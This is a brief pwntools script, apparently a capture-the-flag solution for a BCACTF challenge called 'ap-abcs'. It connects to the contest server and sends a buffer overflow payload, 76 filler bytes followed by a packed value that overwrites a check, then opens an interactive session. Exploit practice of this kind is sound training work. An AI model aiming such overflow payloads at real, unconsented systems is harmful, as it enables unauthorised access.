from pwn import *

# p = process('./ap-abcs')
p = remote('bin.bcactf.com', 49154)

print(p.clean())
p.sendline(b'A' * 76 + p32(0x73434241))

p.interactive()

